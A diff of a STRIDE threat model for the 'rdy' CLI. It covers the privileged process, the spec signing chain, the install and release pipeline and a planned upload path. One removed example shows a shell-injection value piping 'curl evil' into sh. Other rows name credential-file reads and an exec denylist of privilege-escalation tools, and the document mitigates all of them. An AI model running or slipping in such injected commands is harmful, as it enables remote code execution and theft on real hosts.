@@ -1,591 +1,415 @@
 # 05 Threat model
 
-Owner: security-reviewer. Status: draft for review by rust-architect and release-engineer. Date: 2026-10-27.
+Owner: security-reviewer. Revision 2, 2026-10-28, after the code-reviewer review
+(`reviews/05-threat-model-review-by-code-reviewer.md`). Status: draft for re-review.
 
-This document is a STRIDE threat model for `rdy` at M1 scope, with notes on what changes in M2 and later.
-It covers four surfaces:
+This is a STRIDE threat model for `rdy` at M1 scope, with the M2 upload path as requirements. It follows
+the accepted ADRs (0001 to 0012) and the install and signing contract in 06. Where I disagree with an
+ADR, the finding lives in `reviews/adr-and-00-review-by-security-reviewer.md` (cited as "ADR review
+MF-nn or SF-nn"), not here as a second design.
 
-1. The `rdy` CLI running with elevated privileges inside a customer environment.
-2. The spec supply chain: vendor signs, customer verifies.
-3. The install script at getrdy.io/install and the release pipeline.
-4. The opt-in upload path to app.getrdy.io (M2).
+Each mitigation is tagged `[M1]` or `[M2+]` and points to a ticket: `SEC-nn`, a ticket in 06, or
+"fold: <name>", which is a row of the fold table under Tickets implied. Likelihood (L) and impact (I) are
+H, M or L for a design-partner run in M1. The STRIDE tables are in Appendices A to D. The body is the
+requirements, the invariants and the tickets.
 
-Every mitigation carries a milestone tag, `[M1]` or `[M2+]`, and a ticket id `SEC-nn`. The tickets are
-listed at the end. Likelihood (L) and impact (I) are rated H, M or L for a design-partner deployment in M1.
+## The bounded sentence
 
-## The one sentence a customer security reviewer must be able to believe
+In M1, the worst a malicious or buggy signed spec can make `rdy` do is this:
 
-In M1, the worst a malicious or buggy signed spec can make `rdy` do is: run built-in read-only checks,
-open TCP and TLS connections to the endpoints the spec lists (which are printed and recorded), and write
-a report into one new output directory. It cannot run arbitrary commands, write anywhere else, change the
-cluster, read Kubernetes Secrets or send data anywhere.
+- run built-in read-only checks;
+- open connections to the peers in INV-11 (spec endpoints and their redirect hops, spec `ntp_servers`,
+  the configured proxy, system resolvers, the selected Kubernetes API server);
+- write one report into one new output directory.
 
-Every table below exists to keep that sentence true. Anything that would break it (custom exec checks,
-file collection, upload, self-update) is M2 or later and gets its own review.
+It cannot run commands the spec names, write anywhere else, change the cluster, read Kubernetes Secrets
+or send result data anywhere. It can make `rdy` reveal spec hostnames to the network through DNS, SNI and
+HTTP requests. That is the point of a network check.
+
+Everything that would break this sentence is M2 or later and gets its own review: `custom.exec` (M3,
+ADR 0005), file collection and upload (M2), self-update (06).
 
 ## Surface 1: the CLI as a privileged process
 
-### Assets
-
-- Host integrity. `rdy` may run as root.
-- Cluster integrity. The kubeconfig may be cluster-admin.
-- Cloud accounts (M3). Credentials may be broad.
-- Secrets that root can read: `/etc/shadow`, SSH and TLS keys, kubeconfig tokens, proxy credentials in env.
-- The report itself. It is a map of the environment: hostnames, versions, open ports, security agents.
-- The customer's trust in the vendor and in Rdy.
-
-### Trust boundaries
+**Assets.** Host integrity (root). Cluster integrity (cluster-admin kubeconfig). Secrets root can read
+(`/etc/shadow`, keys, `/proc/*/environ`, kubeconfig tokens, proxy credentials). The report itself, which
+maps the environment. The customer's trust.
 
 ```text
- operator shell: root and/or cluster-admin kubeconfig and/or cloud creds
+ operator shell: root and/or cluster-admin kubeconfig
         |  argv, env, cwd, KUBECONFIG
         v
- +--------------------------------- rdy process ---------------------------------+
- |  spec bytes --[TB1: size cap, verify signature]--> parse --> engine --> checks |
- |                                                                 |             |
- |                                             [TB2: probe facade, policy, log]  |
- +-----------------------------------------------------------------|-------------+
-        |                  |                    |                   |
-   /proc, /sys, files   child processes     kube API server     endpoints listed
-   (read only)          (no shell, fixed    (read-only verbs)   in the spec
-                         PATH, timeout)                         (connect, TLS, HEAD)
-        |
-        |  [TB3: redaction before write]
-        v
-   output dir (new, 0700, files 0600) --[TB4: human carries it out, or upload M2]--> vendor
+ +------------------------------- rdy process -------------------------------+
+ | spec bytes --[TB1: bounded read, verify]--> parse --> engine --> checks    |
+ |                                                         |                  |
+ |                          [TB2: mediated Context handles: exec, fs, net,    |
+ |                           kube; policy + action log]                       |
+ +---------------------------------------------------------|------------------+
+     |              |                 |                |              |
+  /proc, /sys,   child processes   kube API server   peers in       kubeconfig
+  files (read,   (fixed program,   (runtime guard)   INV-11         exec plugin
+  denylist)      no shell input)                                    (named exception)
+     |
+     | [TB3: redaction before write]
+     v
+  output dir (new, 0700, files 0600) --[TB4: carried out by hand, or upload in M2]--> vendor
 ```
 
-TB2, the probe facade, is the central control. Every side effect a check performs (exec a command, read
-a file, open a socket, call the kube API) goes through one engine-owned interface. That interface
-enforces the policies below and writes the action log. It is also what fixtures replay in tests, so
-qa-engineer gets it for free. rust-architect owns its API in 02-engine-design.md.
+TB2 is the central control. Checks get four handles on `Context` (ADR review SF-13): `exec`, `fs`
+(read-only, under `host_root`, size capped, denylist), `net` (the policy client) and `kube` (the guarded
+client). Each enforces its policy and appends to the action log. clippy `disallowed-methods` and
+`disallowed-types` keep raw process, socket and file-write APIs out of check code (INV-07).
 
-### STRIDE
+STRIDE table: Appendix A.
 
-| # | Threat | Example attack | L | I | Mitigation | Ticket |
-|---|---|---|---|---|---|---|
-| S1 | Wrong cluster or identity | `KUBECONFIG` points at prod, operator thinks it is staging | M | M | `[M1]` Print context, server URL and authenticated user before the first kube call and in the report. Never switch context. `--context` is explicit. | SEC-24 |
-| S2 | PATH hijack of child commands | Root runs `rdy` with a PATH containing a user-writable dir that holds a fake `uname` | M | H | `[M1]` Prefer `/proc` and `/sys` over commands. When spawning, resolve from a fixed PATH (`/usr/sbin:/usr/bin:/sbin:/bin`) if euid is 0. Scrub `LD_*` and `DYLD_*`. | SEC-18 |
-| T1 | Write outside output dir | Attacker pre-creates `./rdy-out/report.html` as a symlink to `/etc/cron.d/x` in a shared dir | M | H | `[M1]` Create the output dir fresh (fail if it exists), write through a dir handle with no symlink following, temp file plus rename, modes 0700 and 0600. | SEC-19 |
-| T2 | Spec value injection into commands | Spec sets `path: "/x; curl evil \| sh"` | L | H | `[M1]` No shell anywhere. Commands are argv arrays. Spec values are typed (u16 ports, validated hostnames, absolute normalized paths). | SEC-15, SEC-18 |
-| T3 | Script injection into the HTML report | A probed endpoint returns `Server: <script>...`; a node is named with markup; a TLS-intercepting proxy cert has markup in its subject | M | M | `[M1]` askama autoescape, no `safe` filter on data, CSP `default-src 'none'`, no remote assets, golden test with payloads. | SEC-27 |
-| T4 | Terminal escape injection | Same strings carry ANSI escapes that rewrite the operator's terminal | M | L | `[M1]` Strip control characters from untrusted strings before printing. | SEC-28 |
-| R1 | "What did this thing do on my box?" | Security team cannot reconstruct actions after a run | M | M | `[M1]` Action log in the JSON result: every command, file read, endpoint and kube request with time and outcome. `[M2+]` `rdy run --plan` prints it before running. | SEC-17, SEC-40 |
-| I1 | Secrets written into the report | `HTTPS_PROXY=http://svc:pa55@proxy:3128` is echoed as evidence; a bearer token appears in command output | H | H | `[M1]` Minimal redactor on every evidence string before write: URL userinfo, bearer tokens, AWS keys, PEM blocks, rdy tokens. Golden tests. | SEC-25, SEC-26 |
-| I2 | Secrets in logs | `RUST_LOG=trace` makes a dependency log an `Authorization` header | M | H | `[M1]` Default filter caps hyper, h2, rustls, kube at `info`; a redacting layer on log output; test with secret-laden env at trace. | SEC-29 |
-| I3 | Report readable by other users | Report lands in `/tmp` world-readable | M | M | `[M1]` 0700 dir, 0600 files, umask independent. | SEC-19 |
-| I4 | Kubernetes Secret contents read | A check lists `secrets` to count them and the response carries data | L | H | `[M1]` Request allowlist forbids `secrets` reads. "Can I read secrets" is answered with SelfSubjectAccessReview. ConfigMaps listed metadata-only. | SEC-23 |
-| I5 | Phone home | Telemetry, update check or DNS lookup to getrdy.io | L | H | `[M1]` None exists. Integration test in a network namespace, and a contact-set test. | SEC-22 |
-| I6 | Internal reconnaissance via spec | Spec lists 500 internal hosts or `169.254.169.254` | M | M | `[M1]` Connect only to spec-listed endpoints, cap the count, refuse link-local and metadata addresses, never record response bodies. | SEC-21 |
-| D1 | Production impact | Bandwidth sample saturates a link; huge command output exhausts memory | M | M | `[M1]` Every check has a timeout. Bandwidth sample capped in bytes and seconds. Child output capped at 1 MiB. | SEC-18, SEC-21 |
-| D2 | Partial or corrupt report | Crash mid-write | L | L | `[M1]` Atomic rename; exit 70 with a hint. | SEC-19 |
-| E1 | Cluster mutation | Bug or spec makes `rdy` create or delete objects with cluster-admin | L | H | `[M1]` Kube request allowlist: GET, LIST; POST only for SelfSubject*Review and `dryRun=All`. Mock API server test records every request. | SEC-23 |
-| E2 | setuid abuse | An admin installs `rdy` setuid root; local users pass `--output /etc/...` | L | H | `[M1]` Exit 70 if real and effective uid differ. install.sh never sets setuid. | SEC-20, SEC-08 |
-| E3 | Self-escalation | `rdy` calls `sudo` or prompts for a password | L | H | `[M1]` Never. `sudo`, `su`, `doas`, `pkexec` are refused by the exec policy. Checks that need root report `Skipped(NeedsRoot)`. | SEC-18 |
-| E4 | Memory corruption from crafted input | Crafted spec, command output or HTTP response | L | H | `[M1]` `forbid(unsafe_code)` in our crates, dependency policy. `[M2+]` fuzz targets. | SEC-30, SEC-01, SEC-45 |
-| E5 | kubeconfig exec plugin | The kube client runs an `exec` credential command named in a kubeconfig | L | H | `[M1]` Only the operator's own kubeconfig is loaded (default path, `KUBECONFIG`, or `--kubeconfig`). Never from a spec or from cwd. Documented. | SEC-24 |
+### Kubernetes read-only rule and how it is enforced
+
+The allowlist (matches ADR 0010 and adds SelfSubjectReview, which 03 `k8s.access` and `k8s.rbac` use):
+
+- GET and LIST on the resource set named in `rdy-checks-k8s`, reviewed on every change. ConfigMaps
+  metadata-only if ever needed. Never `secrets`, at any path.
+- POST only to `selfsubjectaccessreviews`, `selfsubjectrulesreviews` and `selfsubjectreviews`.
+- Nothing else. 03's optional `dry_run: true` pod create for `k8s.admission` is rejected in M1. It
+  conflicts with ADR 0010 and waits for an ADR 0010 amendment (Decisions needing an ADR).
+
+Enforcement is at runtime. A tower layer added through `kube::client::ClientBuilder` checks method and
+path on every request and fails closed: the request never leaves, and the check reports `Error`.
+`connect()` returns only the guarded client type and `K8sFamily::new` accepts only that type, so there is
+no unguarded client to pass. The mock API server test from ADR 0010 stays as a second line.
 
 ### Residual risks
 
-- Root is root. An operator who runs `rdy` as root trusts our code and our dependencies with the host.
-  We shrink that with read-only behaviour, a small dependency set and an action log. We cannot remove it.
-- kubeconfig exec plugins run whatever the kubeconfig says. That is the operator's own configuration.
-- A vendor-signed spec can still probe internal endpoints it lists. The results stay local unless the
-  customer sends them. Reviewers can read the endpoint list in the spec and the action log.
-- Reports are customer-attested. A customer can edit a report before sending it. Results are evidence,
-  not proof. The portal will label them as customer-reported.
+- Root is root. Read-only behaviour, a small dependency set and the action log shrink the trust needed.
+  They do not remove it.
+- Exec plugins run whatever the operator's kubeconfig says.
+- A signed spec can probe internal endpoints it lists. Results stay local unless the customer sends them.
+- Windows output files inherit folder ACLs.
+- TLS (ADR 0009): `rustls-native-certs` reads only PEM bundles on Linux, so a proxy CA added only to NSS
+  or a Java keystore is invisible. webpki rejects certificates with no SAN, and SHA-1 signatures, that
+  some old appliances still issue. `net.tls_intercept` reports "rejected by rustls policy" as its own
+  result, and docs explain `SSL_CERT_FILE`.
+- Reports are customer-attested. A customer can edit one before sending it.
 
 ## Surface 2: the spec supply chain
 
-### Assets
-
-- The vendor's ed25519 private key.
-- The customer's set of trusted vendor public keys.
-- Spec integrity: thresholds, endpoints, check selection.
-- The customer's decision to run a spec at all.
-
-### Trust boundaries
+**Assets.** The vendor's minisign secret key. The customer's `trust.yaml`. Spec integrity. The
+customer's decision to run.
 
 ```text
- vendor laptop or CI                  transport (untrusted)            customer host
- +----------------------+   spec + signature    email, share link,   +-----------------------+
- | rdy spec sign        | --------------------> file share, USB ---> | rdy verify / rdy run  |
- | key file 0600        |         TB5                                 | trusted keys    TB6   |
- +----------------------+                                            +-----------------------+
-           \                                                                  ^
-            \---- key fingerprint, out of band: vendor docs site, contract, SE -----/
+ vendor (rdy spec sign / stock minisign)        transport (untrusted)          customer host
+ +-----------------------------------+   spec + .minisig    email, link,    +---------------------+
+ | secret key, encrypted, 0600       | ------------------>  file, USB  ---> | rdy verify / run    |
+ +-----------------------------------+         TB5                          | trust.yaml     TB6  |
+                 \                                                          +---------------------+
+                  \--- public key and fingerprint, out of band (vendor docs, SE) ----^
 ```
 
-The key that verifies a spec must never arrive in the same artifact as the spec. In M1 the customer pins
-vendor keys locally: a `--trusted-key <file>` flag, or files in `~/.config/rdy/trusted-keys/` and
-`/etc/rdy/trusted-keys/`. Whether this becomes an `rdy trust` subcommand is cli-ux's call.
+The design is ADR 0002: minisign format, verified with `minisign-verify`, keys pinned per product in
+`trust.yaml`, `--key`, `--trust-key` and `rdy trust`. This model adds these requirements on top:
 
-### Requirements for the signing format (input to 01-spec-format.md)
+1. **Order.** Read the spec and `.minisig` with bounded reads. Take the key id from the `.minisig` and the
+   product from the signed trusted comment. Find a key pinned for that product with that id. Verify the
+   raw bytes with `allow_legacy = false`. Only then parse. After parsing, `metadata.product` must equal the
+   pinned product and the trusted-comment product. This is compatible with ADR 0002 and gives INV-01.
+2. **Weak keys.** Small-order and malformed public keys are refused at `rdy trust add` and `--key`, using
+   test vectors run against `minisign-verify`.
+3. **Trust store ownership.** A user run reads `$XDG_CONFIG_HOME/rdy/trust.yaml`, then `/etc/rdy/trust.yaml`.
+   A root run (euid 0) reads only `/etc/rdy/trust.yaml`, whatever `HOME` or `XDG_CONFIG_HOME` say, because
+   macOS `sudo`, `sudo -E` and `su` without `-` keep them. The file and its directory must be root-owned
+   and not group or world writable. The file must not be a symlink. On violation: exit 64 with a fix hint
+   naming the path and the `chown` and `chmod` to run. Writes are atomic, mode 0644. On Windows the system
+   store is `%ProgramData%\rdy\trust.yaml`, and the rule is "writable only by Administrators and SYSTEM".
+4. **`--allow-unsigned`** is read from argv only and stamps the reports, as ADR 0002 says. Whether it may
+   run a spec whose signature fails, as opposed to one with no signature, is ADR review SF-02.
+5. **Domain separation** through a fixed trusted-comment prefix is proposed in ADR review SF-01.
 
-- The signature covers the exact bytes of the spec file. No re-serialization, no YAML canonicalization.
-- The signed message is prefixed with a fixed context string, for example `rdy-spec-v1\0`, so a spec
-  signature can never be replayed as a signature over anything else.
-- One algorithm: Ed25519. No algorithm field the verifier obeys. Verify with `verify_strict`.
-- The signature record carries a key id (fingerprint of the public key), not the key.
-- The result JSON records the spec SHA-256, the key fingerprint and the signature status
-  (`verified`, `unsigned-allowed`). The verified spec is copied into the output dir.
-- `[M2+]` A `serial` and optional `expires` inside the signed bytes, for rollback and stale-spec warnings.
-
-### STRIDE
-
-| # | Threat | Example attack | L | I | Mitigation | Ticket |
-|---|---|---|---|---|---|---|
-| S1 | Impersonated vendor | Attacker signs a spec with their own key and emails it as "acme-platform" | M | M | `[M1]` Unknown key means refuse. Output shows signer fingerprint and the local label of the pinned key, never a name taken from the spec. | SEC-13 |
-| S2 | Self-certifying spec | Envelope includes a public key and the verifier uses it | M | H | `[M1]` Invariant: keys come only from the local trust store or `--trusted-key`. Test with an envelope that carries a key. | SEC-13 |
-| T1 | Tampered in transit | Threshold `min: 32Gi` edited to `min: 1Gi` | M | M | `[M1]` Verify signature over raw bytes before parsing. | SEC-12 |
-| T2 | Signature stripping plus social engineering | "Just add `--allow-unsigned`, our signing is broken today" | M | M | `[M1]` Flag only on argv (no env, no config file). Loud banner. `UNSIGNED SPEC` watermark in HTML and JSON. TTY confirmation, default no. | SEC-14 |
-| T3 | Parser differential | Duplicate keys or a second YAML document make the verified bytes mean something else | L | H | `[M1]` Single document only, duplicate keys rejected, unknown fields rejected. | SEC-15 |
-| T4 | Rollback | Replay an older signed spec with weaker thresholds | L | L | `[M1]` Spec digest recorded in result. `[M2+]` serial and expiry. | SEC-12, SEC-46 |
-| R1 | Dispute over which spec ran | "We never sent that spec" | L | M | `[M1]` Result records spec digest and key fingerprint; signed spec kept in output dir. | SEC-12 |
-| I1 | Vendor private key leak | Key committed to a repo or printed in CI logs | M | H | `[M1]` keygen writes 0600 with exclusive create; `rdy spec sign` refuses group or world readable keys; secret is never printed; zeroized in memory. `[M2+]` rotation and revocation. | SEC-16, SEC-46 |
-| D1 | Parser exhaustion | Billion-laughs aliases, 10,000-deep nesting, 2 GB file | M | L | `[M1]` 1 MiB cap before verification; anchors and aliases rejected; depth limit 64. | SEC-15 |
-| D2 | Regex blowup | Custom redaction pattern in spec (M2) | L | L | `[M2+]` `regex` crate (linear time) with size limits. | SEC-44 |
-| E1 | Capability creep through spec | Unknown check id, exec check, file collection glob | M | H | `[M1]` Only built-in check ids; unknown id is an error. No exec checks. `[M2+]` collection behind a path policy; exec behind `--allow-exec`. | SEC-15, SEC-43, SEC-53 |
-| E2 | Signature malleability or weak keys | Small-order public key accepted | L | M | `[M1]` `ed25519-dalek` `verify_strict`; test vectors for weak keys. | SEC-12 |
+STRIDE table: Appendix B.
 
 ### Residual risks
 
-- Key distribution is manual in M1. A customer who pins the wrong key trusts the wrong vendor. Docs tell
-  vendors to publish the fingerprint on their own site.
-- No revocation in M1. A leaked vendor key stays valid on customer machines until they remove it.
-- From M2 the portal may sign on the vendor's behalf. A compromised portal could then sign a spec. The
-  bounded blast radius above is what limits the damage, so it must stay true in M2.
+- Key distribution is manual in M1. Pinning the wrong key trusts the wrong vendor.
+- No revocation in v1 (ADR 0002). A leaked key stays trusted until removed by hand.
+- From M2, the portal is in the trust chain. The bounded sentence is what limits a compromised portal.
 
 ## Surface 3: install script and release pipeline
 
-### Assets
+06 owns the mechanics. Its table "Install and signing contract (agreed with 05)" is the security
+contract for this surface. **I confirm every row of it**, with one disagreement:
 
-- The maintainer's GitHub account and the `getrdy-io` org.
-- `release.yml` and its OIDC identity (the thing cosign keyless binds signatures to).
-- The Cloudflare account that serves getrdy.io and the domain registrar account.
-- crates.io ownership of every `rdy*` name.
-- Release artifacts: archives, checksum file, Sigstore bundle, SBOM.
+- **Hash check portability.** The verification line `sha256sum --ignore-missing -c SHA256SUMS` is
+  GNU-only. busybox (Alpine) lacks `--ignore-missing`, and macOS has `shasum`. A script that falls back to
+  "skip" on such a host would install an unchecked binary. Requirement: `install.sh` selects the single
+  `SHA256SUMS` line whose file name equals the downloaded archive name exactly, computes the digest with
+  `sha256sum`, `shasum -a 256` or `openssl dgst -sha256` (first one present), and compares. If none is
+  present, or no line matches, it stops. The docs command may keep `--ignore-missing` with the macOS
+  alternative next to it.
 
-### Trust boundaries
+Also confirmed: the exact signer identity
+`https://github.com/getrdy-io/rdy/.github/workflows/sign-release.yml@refs/tags/v<VERSION>` pinned per
+version in `install.sh`; the human regexp in 06 allows `-alpha.N` tags; `scripts/verify-release.sh`
+holds the one canonical command. Immutable releases are 06's plan. If the sandbox proof fails, the
+fallback control is the signature check, which fails closed on any swapped asset. 06 records the gap.
 
 ```text
- maintainer --push tag v*--> GitHub (rulesets, 2FA) --> release.yml (SHA-pinned actions)
-                                                          | cargo build --locked (cargo-dist)
-                                                          | cosign sign-blob (keyless, OIDC)
-                                                          v
-                         GitHub Release (immutable): archives, SHA256SUMS, SHA256SUMS.sigstore.json, SBOM
-                                                          ^
- customer: curl --proto '=https' --tlsv1.2 -sSf https://getrdy.io/install | sh
-              |                                           |
-          TB7: script from Cloudflare Pages          TB8: artifacts from GitHub
+ maintainer --tag v*--> GitHub (rulesets) --> release (dist) --> sign-release.yml (env "release", approval)
+                                                                   | cosign keyless, OIDC
+                                                                   v
+                        GitHub Release: archives, SBOM, install.sh, SHA256SUMS, SHA256SUMS.sigstore.json
+                                                                   ^
+ customer: curl ... getrdy.io/install | sh  (M2; M1 uses the pinned release URL) -+
+           TB7: script origin                     TB8: artifact origin
 ```
 
-The script and the binaries come from different origins on purpose. A compromise of one origin alone is
-caught: a swapped binary fails the signature check, and a reviewer can diff the served script against
-the signed copy attached to the release. A compromise of getrdy.io still lets an attacker serve a script
-that skips verification. That is the curl-pipe-sh residual risk, and the verify-first path in the docs
-exists for reviewers who will not accept it.
-
-### install.sh behaviour (input to 06-release-and-distribution.md)
-
-- POSIX sh, `set -eu`, shellcheck clean. All logic in `main()`, called on the last line, so a truncated
-  download runs nothing.
-- Refuses to run when `id -u` is 0 unless `--allow-root` is given (`sh -s -- --allow-root`).
-- Installs to `$HOME/.local/bin` by default. Never calls sudo. Never edits shell rc files; prints a PATH
-  hint instead. Never sets setuid.
-- Detects OS and arch against an allowlist; unknown means stop.
-- Downloads into `mktemp -d` with a cleanup trap, using `curl --proto '=https' --tlsv1.2 -fsSL`.
-- Verifies `SHA256SUMS` with `cosign verify-blob` pinned to the release workflow identity, then verifies
-  the archive hash against it, then extracts. Nothing is made executable before both pass.
-- If cosign is not installed, it stops and prints the two-line manual verification path. The escape hatch
-  is `RDY_INSECURE_SKIP_SIGNATURE=1`, which still checks the hash and prints a loud warning. See the ADR
-  note at the end.
-
-Verification command the docs and the script both use:
-
-```sh
-cosign verify-blob \
-  --bundle SHA256SUMS.sigstore.json \
-  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
-  --certificate-identity-regexp '^https://github\.com/getrdy-io/rdy/\.github/workflows/release\.yml@refs/tags/v[0-9]+\.[0-9]+\.[0-9]+$' \
-  SHA256SUMS
-sha256sum --ignore-missing -c SHA256SUMS
-```
-
-### STRIDE
-
-| # | Threat | Example attack | L | I | Mitigation | Ticket |
-|---|---|---|---|---|---|---|
-| S1 | Typosquat crate or domain | `cargo install rdy-cli` pulls an attacker crate; a lookalike domain | M | H | `[M1]` Reserve `rdy-cli` and the planned names on crates.io. Docs show one install URL. | SEC-11 |
-| S2 | Signature from the wrong identity | A fork's workflow signs a malicious build with valid Sigstore certs | M | H | `[M1]` Verification pins issuer and exact workflow identity on tag refs. Release workflow self-verifies. | SEC-06, SEC-09 |
-| T1 | getrdy.io serves a malicious script | Cloudflare or registrar account takeover, DNS hijack | L | H | `[M1]` Hardware-key MFA on registrar, Cloudflare, GitHub; registrar lock; DNSSEC; CAA; HSTS. Signed copy of install.sh in each release. Verify-first docs. | SEC-05, SEC-31 |
-| T2 | Truncated script runs | Connection drops mid-download | L | M | `[M1]` `main()` guard. | SEC-08 |
-| T3 | Release asset replaced after publish | Stolen token re-uploads an archive | L | H | `[M1]` GitHub immutable releases on; signature check fails on any swap. | SEC-04, SEC-06 |
-| T4 | Compromised third-party Action | A mutable action tag is retargeted, as with `tj-actions/changed-files` in March 2025 | M | H | `[M1]` Pin every action to a full commit SHA. zizmor in CI. Default `permissions: contents: read`; `id-token: write` only in the signing job. | SEC-03 |
-| T5 | Malicious dependency | New crate version with a `build.rs` payload | M | H | `[M1]` Cargo.lock committed, `--locked` everywhere, crates.io only, new-dependency review, daily advisories. | SEC-01, SEC-02 |
-| T6 | Fork PR reaches secrets | `pull_request_target` workflow checks out untrusted code | L | H | `[M1]` No `pull_request_target`. No secrets in PR workflows. | SEC-03 |
-| R1 | Unattributable release | "Who published 0.3.1?" | L | M | `[M1]` Rekor entry per signature; GitHub audit log; release only from tags. | SEC-06 |
-| I1 | Long-lived secrets leak from CI | crates.io token printed in a log | L | M | `[M1]` Keyless signing (no signing key to leak). crates.io trusted publishing. | SEC-06, SEC-11 |
-| D1 | Install path unavailable | getrdy.io down, GitHub rate limit | M | L | `[M1]` Documented direct download and air-gap path. | SEC-31 |
-| E1 | Installer as root | Script run with sudo writes into system paths | M | M | `[M1]` Refuses root unless `--allow-root`; user-local install; never sudo. | SEC-08 |
-| E2 | Maintainer account takeover | Attacker pushes a tag and gets a legit-looking signed release | L | H | `[M1]` Hardware-key 2FA, tag ruleset limits who creates `v*`, release job runs in a GitHub environment that needs a manual approval click. | SEC-04 |
+STRIDE table: Appendix C.
 
 ### Residual risks
 
-- curl-pipe-sh trusts getrdy.io for the script itself. Mitigated, not removed.
-- One maintainer. Two-person review of releases is not possible yet. A stolen, unlocked founder session
-  can ship a release. Hardware keys and the manual approval step are the controls.
-- cosign is rarely preinstalled. Fail-closed install hurts first-run UX. Tracked as an ADR.
-- No Windows Authenticode or macOS notarization in M1. Windows SmartScreen and some EDR tools will flag
-  the binary. `[M2+]` SEC-50.
-- cargo-dist maintenance pace should be checked by release-engineer before we depend on it for signing.
+- curl-pipe-sh trusts getrdy.io for the script itself.
+- One maintainer, so no two-person release review.
+- cosign is rarely installed. Fail-closed costs first-run convenience. 06 accepted that.
+- No Authenticode or notarization in M1, so SmartScreen and some EDR tools will flag `rdy` (SEC-50).
 
-## Surface 4: the opt-in upload path (M2)
+## Surface 4: the upload path (M2)
 
-M1 has no upload code. The M1 invariant is simply that no code path sends result data anywhere.
-This section fixes the requirements now so M2 does not have to retrofit them.
+M1 has no upload code. The full STRIDE table is Appendix D. The requirements M2 must meet:
 
-### Assets
-
-- The share-link token.
-- Result JSON and bundles: customer environment data.
-- The vendor's view in the portal (integrity of what SEs see).
-
-### Trust boundaries
-
-```text
- customer host                          customer egress                 Rdy Cloud (private repo)
- +---------------------------+          proxy, maybe TLS inspection     +-------------------------+
- | output dir (redacted)     |                                          | app.getrdy.io API        |
- |  result.json, bundle      | --rdy upload, explicit--> TB10 --------> | token -> one share link  |
- |  upload-receipt.json      |  TB9: consent prompt, file list, bytes   | write-only scope         |
- +---------------------------+                                          +-------------------------+
-```
-
-### STRIDE
-
-| # | Threat | Example attack | L | I | Mitigation | Ticket |
-|---|---|---|---|---|---|---|
-| S1 | Fake portal | Pasted command includes `--server https://app.getrdy-io.com` | M | H | `[M2+]` Default server fixed. A non-default server is shown in the consent prompt and recorded in the receipt. TLS via the platform verifier. | SEC-41 |
-| S2 | Stolen token posts fake results | Attacker poisons the vendor's dashboard | M | M | `[M2+]` Token is write-only, scoped to one share link, expires, rate limited, revocable. Portal labels results customer-reported. | SEC-42 |
-| T1 | Payload altered in transit | Intercepting proxy edits the body | L | M | `[M2+]` TLS; SHA-256 of each file in a header; server verifies and echoes it in the receipt. | SEC-41 |
-| T2 | Server drives client behaviour | Response says "now collect /etc/shadow" or "fetch this spec" | L | H | `[M2+]` Client parses only a receipt id and a URL to print. Nothing else in the response is acted on. | SEC-41 |
-| R1 | Customer cannot prove what left | "Your tool sent our hostnames" | M | M | `[M2+]` Upload sends the exact on-disk bytes of listed files, no extra fields. `upload-receipt.json` records digests, sizes, destination, time, server id. | SEC-41 |
-| I1 | Upload without consent | Default behaviour sends data | L | H | `[M1]` No upload code exists. `[M2+]` Upload only with `--upload` or an interactive yes (default no). Non-TTY never prompts and never uploads without the flag. | SEC-22, SEC-41 |
-| I2 | Unredacted data leaves | Upload reads a file outside the output dir | M | H | `[M2+]` Upload reads only files named in the output dir manifest, which were redacted before write. | SEC-41, SEC-44 |
-| I3 | Token leaks | Token in argv shows up in `ps`, shell history, CI logs; token in URL lands in proxy logs | H | M | `[M2+]` Token from `RDY_TOKEN`, `--token-file` or a prompt. Sent only in the `Authorization` header. Recognizable prefix (`rdy_st_`) so the redactor and secret scanners catch it. | SEC-41, SEC-42, SEC-25 |
-| I4 | Cross-tenant leak in portal | One vendor sees another's results | L | H | Out of scope here. rdy-cloud needs its own threat model before M2 beta. | none |
-| D1 | Oversized upload or retry storm | 5 GB bundle, infinite retries | L | L | `[M2+]` Client size cap per tier; bounded retries with backoff. | SEC-41 |
-| E1 | Token grants more than upload | Token reads other results or signs in | L | H | `[M2+]` Write-only scope enforced server side; separate from any user session. | SEC-42 |
-
-### Residual risks
-
-- The customer's TLS-inspecting proxy sees uploaded content. That is the customer's own control point.
-  We do not pin certificates, because pinning breaks the corporate proxies our users sit behind.
-- Results are customer-attested (see surface 1).
+1. No upload without `--upload` or an interactive yes (default no). A non-TTY run never prompts.
+2. Upload reads only files listed in the output dir manifest, which were redacted before write, and
+   sends their exact bytes.
+3. `upload-receipt.json` records digests, sizes, destination, time and the server's id.
+4. The token comes from `RDY_TOKEN`, `--token-file` or a prompt, never argv. It is sent only in
+   `Authorization`, has a recognizable prefix (`rdy_st_`), and is write-only, per share link, expiring and
+   revocable.
+5. The client reads only a receipt id and a URL from the response. It never acts on anything else.
+6. The default server is fixed. Any other server is shown in the consent prompt and the receipt.
 
 ## Security invariants
 
-These are the statements the code must keep true. Each has a test. A PR that breaks one fails CI.
+Each is a statement that CI tests. "Fold" names the existing ticket that carries the test.
 
-| Id | Invariant | Test | Milestone |
-|---|---|---|---|
-| INV-01 | No spec byte reaches the YAML parser before the signature verifies, unless `--allow-unsigned` is on argv. | Unit test with a parser spy; tampered spec never parsed. | M1 |
-| INV-02 | A spec larger than 1 MiB is rejected before verification. | Unit test with a 1 MiB + 1 byte file. | M1 |
-| INV-03 | Verification keys come only from `--trusted-key` or the trust store dirs. A key inside the spec or envelope is ignored. | Envelope carrying its own key fails with "unknown key". | M1 |
-| INV-04 | `--allow-unsigned` cannot be set by env var or config file, and an unsigned run marks HTML and JSON as unsigned. | Integration test checks env/config are ignored and golden output contains the watermark. | M1 |
-| INV-05 | Unknown check ids, unknown fields, duplicate keys, anchors, aliases and multi-document streams are errors (exit 64). | Proptest and fixture cases. | M1 |
-| INV-06 | Every check side effect goes through the probe facade and appears in the action log. | Test that a run's log lists every fixture command, file and endpoint used; lint forbids `std::process::Command` and `std::net` outside the facade crate module. | M1 |
-| INV-07 | No shell is ever spawned, and `sudo`, `su`, `doas`, `pkexec` are never executed. | Facade unit test; grep test for `sh -c` and `cmd /C`. | M1 |
-| INV-08 | All files are written inside one newly created output dir, with 0700 and 0600 on Unix. Symlinks are never followed on write. | Pre-planted symlink test; mode test. | M1 |
-| INV-09 | `rdy` exits 70 when real and effective uid differ. | Unit test on the check function. | M1 |
-| INV-10 | The only network peers are endpoints listed in the verified spec and the selected kube API server. | Run under `unshare -rn` with a no-net spec (passes); contact-set test with local listeners. | M1 |
